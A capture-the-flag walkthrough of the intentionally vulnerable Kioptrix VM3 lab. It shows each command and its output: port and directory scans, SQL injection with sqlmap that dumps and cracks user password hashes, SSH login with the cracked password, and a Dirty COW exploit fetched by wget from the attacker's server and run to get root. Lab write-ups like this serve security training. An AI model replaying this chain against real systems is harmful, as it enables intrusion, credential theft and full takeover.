## Kioptrix VM3 Walkthrough BY MIDO ##

## Prerequisites:

    Kioptrix VM3 image running on VMware.
    Attacker machine (e.g., Kali Linux).
    Basic knowledge of Linux and penetration testing tools.

## 1.Network Configuration and Target Information

    Ensure the VM3 is running and connected to the same network as your attacking machine.
    Find the IP address of the Kioptrix VM3 by using nmap from your attacker machine:



IN MY CASE THE TARGET IP WAS 192.168.48.149



## nmap 192.168.48.1/24 -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 02:31 +01
Nmap scan report for 192.168.48.1
Host is up (0.00030s latency).
All 1000 scanned ports on 192.168.48.1 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 192.168.48.2
Host is up (0.00019s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE    SERVICE
53/tcp filtered domain
MAC Address: 00:50:56:E6:DB:DE (VMware)

Nmap scan report for 192.168.48.149
Host is up (0.0031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:FD:CB:95 (VMware)

Nmap scan report for 192.168.48.254
Host is up (0.00023s latency).
All 1000 scanned ports on 192.168.48.254 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:E4:3B:D9 (VMware)

Nmap scan report for 192.168.48.157
Host is up (0.0000040s latency).
All 1000 scanned ports on 192.168.48.157 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (5 hosts up) scanned in 9.44 seconds


## 2.after the enumeration of the targeted machine bind the ip adress with the domaine.


## nano /etc/hosts        
                                
ADD 192.168.48.149 kioptrix3.com
                                                                                              
┌──(root㉿kali)-[/home/kali]
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
192.168.48.149  kioptrix3.com
                                

## 3.Service Enumeration (Port Scanning)

    Run a full port scan to identify open ports and services on the target:

   ## nmap 192.168.48.149 -sV   

Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 02:37 +01
Nmap scan report for kioptrix3.com (192.168.48.149)
Host is up (0.00044s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 00:0C:29:FD:CB:95 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
                                                           



## 4.Enumerating HTTP Services

port 80 (HTTP) is open, access the web application by opening a browser and navigating to:


## http://kioptrix3.com/


Use tools like Nikto for vuln and Gobuster to enumerate hidden directories:

## gobuster dir -u http://kioptrix3.com/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://kioptrix3.com/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 355] [--> http://kioptrix3.com/modules/]
/gallery              (Status: 301) [Size: 355] [--> http://kioptrix3.com/gallery/]
/data                 (Status: 403) [Size: 324]
/core                 (Status: 301) [Size: 352] [--> http://kioptrix3.com/core/]
/style                (Status: 301) [Size: 353] [--> http://kioptrix3.com/style/]
/cache                (Status: 301) [Size: 353] [--> http://kioptrix3.com/cache/]
/phpmyadmin           (Status: 301) [Size: 358] [--> http://kioptrix3.com/phpmyadmin/]
/server-status        (Status: 403) [Size: 333]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================


## Scan with Nikto this domain and the 301 statut directory till u found that the directory with SQLdb: (/gallery)

## nikto -h kioptrix3.com/gallery

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.48.149
+ Target Hostname:    kioptrix3.com
+ Target Port:        80
+ Start Time:         2025-01-15 02:50:27 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ /gallery/: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6.
+ /gallery/: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /gallery/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /gallery/: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.2 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /gallery/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /gallery/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /gallery/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /gallery/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /gallery/db.sql: Server may leak inodes via ETags, header found with file /gallery/db.sql, inode: 630988, size: 3573, mtime: Sat Oct 10 19:43:52 2009. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418

+ /gallery/db.sql: DATABASE SQL FOUND........!!!!!......

+ /gallery/login.php: Admin login page/section found.
+ /gallery/#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7961 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2025-01-15 02:50:48 (GMT1) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


## Database SQL found


Now we know that we have a SQLdb in this path /gallery/.

## Open mozilla search for query structure on : 

http://kioptrix3.com/gallery


after 20 minute of explorations i have found a suspicious link


## http://kioptrix3.com/gallery/gallery.php?id=1




## 5.Web Application Exploitation

We identify a SQL injection vulnerability we use sqlmap for automated exploitation:


## sqlmap --batch --banner  -u http://kioptrix3.com/gallery/gallery.php?id=1 --dump
        ___
       __H__                                                                                                          
 ___ ___[.]_____ ___ ___  {1.9#stable}                                                                                
|_ -| . [.]     | .'| . |                                                                                             
|___|_  [,]_|_|_|__,|  _|                                                                                             
      |_|V...       |_|   https://sqlmap.org                                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:12:20 /2025-01-15/

[03:12:20] [INFO] resuming back-end DBMS 'mysql' 
[03:12:20] [INFO] testing connection to the target URL
[03:12:20] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=ec9e994c215...bbe3054e6c'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (9676=9676) THEN 1 ELSE (SELECT 9579 UNION SELECT 2661) END))

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=1 OR ROW(6704,1923)>(SELECT COUNT(*),CONCAT(0x7170767a71,(SELECT (ELT(6704=6704,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM (SELECT 1006 UNION SELECT 3402 UNION SELECT 2932 UNION SELECT 1221)a GROUP BY x)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 8737 FROM (SELECT(SLEEP(5)))QQUw)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT CONCAT(0x7170767a71,0x4d555469506255685575426e6645744757455864726c614759504345636c5a4872786b7071414b52,0x7178707671),NULL,NULL,NULL,NULL,NULL-- -
---
[03:12:20] [INFO] the back-end DBMS is MySQL
[03:12:20] [INFO] fetching banner
[03:12:20] [INFO] resumed: '5.0.51a-3ubuntu5.4'
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP, PHP 5.2.4, Apache 2.2.8
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 4.1
banner: '5.0.51a-3ubuntu5.4'
[03:12:20] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[03:12:20] [INFO] fetching current database
[03:12:20] [INFO] fetching tables for database: 'gallery'
[03:12:20] [INFO] retrieved: 'dev_accounts'
[03:12:20] [INFO] retrieved: 'gallarific_comments'
[03:12:21] [INFO] retrieved: 'gallarific_galleries'
[03:12:21] [INFO] retrieved: 'gallarific_photos'
[03:12:21] [INFO] retrieved: 'gallarific_settings'
[03:12:21] [INFO] retrieved: 'gallarific_stats'
[03:12:21] [INFO] retrieved: 'gallarific_users'
[03:12:21] [INFO] fetching columns for table 'dev_accounts' in database 'gallery'                                    
[03:12:21] [INFO] resumed: 'id'                                                                                      
[03:12:21] [INFO] resumed: 'int(10)'
[03:12:21] [INFO] resumed: 'username'
[03:12:21] [INFO] resumed: 'varchar(50)'
[03:12:21] [INFO] resumed: 'password'
[03:12:21] [INFO] resumed: 'varchar(50)'
[03:12:21] [INFO] fetching entries for table 'dev_accounts' in database 'gallery'
[03:12:21] [INFO] resumed: '1','0d3eccfb887aabd50f243b3f155c0f85','dreg'
[03:12:21] [INFO] resumed: '2','5badcaf789d3d1d09794d8f021f40f0e','loneferret'
[03:12:21] [INFO] recognized possible password hashes in column 'password'                                           
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[03:12:21] [INFO] using hash method 'md5_generic_passwd'
[03:12:21] [INFO] resuming password 'Mast3r' for hash '0d3eccfb887aabd50f243b3f155c0f85' for user 'dreg'
[03:12:21] [INFO] resuming password 'starwars' for hash '5badcaf789d3d1d09794d8f021f40f0e' for user 'loneferret'
Database: gallery
Table: dev_accounts
[2 entries]
+----+---------------------------------------------+------------+
| id | password                                    | username   |
+----+---------------------------------------------+------------+
| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |
| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |
+----+---------------------------------------------+------------+

[03:12:21] [INFO] table 'gallery.dev_accounts' dumped to CSV file '/root/.local/share/sqlmap/output/kioptrix3.com/dump/gallery/dev_accounts.csv'                                                                                            
[03:12:21] [INFO] fetching columns for table 'gallarific_comments' in database 'gallery'
[03:12:21] [INFO] resumed: 'comment','text'
[03:12:21] [INFO] fetching entries for table 'gallarific_comments' in database 'gallery'                             
[03:12:21] [INFO] fetching number of entries for table 'gallarific_comments' in database 'gallery'
[03:12:21] [INFO] resumed: 0
[03:12:21] [WARNING] table 'gallarific_comments' in database 'gallery' appears to be empty
Database: gallery
Table: gallarific_comments
[0 entries]
+-----------+
| comment   |
+-----------+
+-----------+

I dragged the hashs from DATABASE now I have a SSH user and passwd !!!!

## SSH Command 

## ssh loneferret@192.168.48.149
Unable to negotiate with 192.168.48.149 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss


## ssh loneferret@192.168.48.149 -oHostKeyAlgorithms=+ssh-rsa
### loneferret@192.168.48.149's password:starwars
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Thu Jan  9 21:50:43 2025 from 192.168.48.157
### loneferret@Kioptrix3:~$ pwd
/home/loneferret
### loneferret@Kioptrix3:~$ uname -a
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
### loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
### loneferret@Kioptrix3:~$ ls
checksec.sh  CompanyPolicy.README



## OPPEN NEW TAB

## 6.Privilege Escalation

    Once we have gained access (via reverse shell, web shell, or other means), you may have low-level user privileges like this case.
    Check for SUID programs and check for misconfigurations that may allow privilege escalation:

## Searchsploit

## searchsploit -m linux/local/40839.c
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
    Codes: CVE-2016-5195
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/40839.c

## SAME TAB

## Python server


## python3 -m http.server             
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


...Run wget in target shell...


## loneferret@Kioptrix3:~$ wget http://192.168.48.157:8000/40839.c
--23:18:38--  http://192.168.48.157:8000/40839.c
           => `40839.c'
Connecting to 192.168.48.157:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4,814 (4.7K) [text/x-csrc]

100%[==========================================================================>] 4,814         --.--K/s             

23:18:38 (771.59 MB/s) - `40839.c' saved [4814/4814]

## loneferret@Kioptrix3:~$ ls
40839.c  checksec.sh  CompanyPolicy.README

## loneferret@Kioptrix3:~$ gcc -pthread 40839.c -o dirty -lcrypt
40839.c:193:2: warning: no newline at end of file

## loneferret@Kioptrix3:~$ ls
40839.c  checksec.sh  CompanyPolicy.README  dirty

## loneferret@Kioptrix3:~$ chmod +x dirty

## loneferret@Kioptrix3:~$ ./dirty

/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:abcd 
Complete line:
firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash

mmap: b7fe0000

## Tap enter or Control C

## loneferret@Kioptrix3:~$ su firefart
Password:abcd

## firefart@Kioptrix3:~# whoami
firefart

## firefart@Kioptrix3:~# pwd
/root

## firefart@Kioptrix3:~# ls
Congrats.txt  ht-2.0.18

## firefart@Kioptrix3:~# cat Congrats.txt 
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
